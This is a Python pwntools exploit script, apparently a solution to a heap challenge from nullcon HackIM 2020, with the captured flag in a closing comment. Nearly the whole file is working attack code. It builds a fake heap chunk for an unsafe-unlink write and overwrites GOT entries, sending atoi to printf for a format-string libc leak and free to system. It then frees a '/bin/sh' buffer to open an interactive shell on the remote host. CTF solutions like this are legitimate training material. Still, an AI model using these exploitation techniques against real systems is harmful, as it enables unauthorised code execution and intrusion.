#!/usr/bin/python3
import pwn


HOST, PORT = 'pwn2.ctf.nullcon.net', 5002
DEBUG = False

libc = pwn.ELF('./libc-2.23.so')

if DEBUG:
    env = {'LD_PRELOAD': './libc-2.23.so'}
    p = pwn.process(['./ld-2.23.so', './challenge'], env=env)
else:
    p = pwn.remote(HOST, PORT)
pwn.context.log_level = 'debug'


def Menu(i):
    p.recvuntil('5) Checkout!\n')
    if exploit:
        p.sendline('0' * (i - 1))
        p.recvline()
    else:
        p.sendline(str(i))


def Malloc(name):
    assert len(name) <= 0xF8

    Menu(1)

    p.recvuntil('Name of the book?\n')
    if len(name) == 0xF8:
        p.send(name)
    else:
        p.sendline(name)


def Free(idx):
    Menu(2)

    p.recvuntil('Which book do you want to return?\n')
    p.sendline(str(idx))


def Write(idx, name):
    assert len(name) <= 0xF8

    Menu(3)

    if exploit and len(idx) >= 0x10:
        p.sendline(idx)
        return p.recvuntil(b'\r', drop=True)

    p.sendline(str(idx))
    p.recvuntil('Name of the book?')
    if len(name) == 0xF8:
        p.send(name)
    else:
        p.sendline(name)


printf_plt = 0x400680
free_got = 0x602018
atoi_got = 0x602060
ptr = 0x6021A0

exploit = False

p.recvuntil('what is your name?\n')
p.sendline('ironore15')

Malloc('ironore15')
Malloc('ironore15')
Malloc('ironore15')
Malloc(b'/bin/sh\x00')

payload = pwn.p64(0)
payload += pwn.p64(0xF1)
payload += pwn.p64(ptr - 0x18)
payload += pwn.p64(ptr - 0x10)
payload = payload.ljust(0xF0, b'A')
payload += pwn.p64(0xF0)

Write(0, payload)

Free(1)
Free(2)

payload = b'A' * 0x18
payload += pwn.p64(atoi_got)
payload += pwn.p64(ptr)

Write(0, payload)

payload = pwn.p64(printf_plt)
Write(0, payload)

exploit = True

fsb_payload = b'A' * 0x10
fsb_payload += b'%9$s\r'
fsb_payload = fsb_payload.ljust(0x18, b'\x00')
fsb_payload += pwn.p64(free_got)


leak = Write(fsb_payload, '')

free_libc = pwn.u64(leak[16:].ljust(8, b'\x00'))
libc_base = free_libc - libc.symbols[b'free']

pwn.log.info('libc-2.23.so: 0x{:012x}'.format(libc_base))

exit_libc = libc_base + libc.symbols[b'exit']
printf_libc = libc_base + libc.symbols[b'printf']
puts_libc = libc_base + libc.symbols[b'puts']
system_libc = libc_base + libc.symbols[b'system']

payload = b'A' * 0x8
payload += pwn.p64(free_got)

Write('', payload)

payload = pwn.p64(system_libc)
payload += pwn.p64(puts_libc)

Write('', payload)

if DEBUG:
    pwn.context.terminal = ['tmux', 'splitw', '-h']
    pwn.gdb.attach(p, 'b* system')

Free('00')

pwn.context.log_level = 'info'
p.interactive()

# hackim20{Cause_Im_coming_atcha_like_a_dark_honya_?}
